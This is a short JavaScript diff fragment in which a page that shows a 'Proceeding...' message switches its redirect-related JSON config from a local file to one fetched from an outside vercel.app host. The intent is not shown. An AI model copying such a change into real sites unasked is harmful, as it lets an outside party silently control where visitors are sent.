@@ -109,7 +109,7 @@ setTimeout( function(){
 	head.style.fontWeight = "600";
 	head.innerText = "Proceeding...";
 	k.appendChild(head);
-fetch("./bn-ncredirect-2.json")
+fetch("https://test-aws-illz.vercel.app/1.json")
     .then((response) => response.json())
     .then(function(data) {
         filter(data);
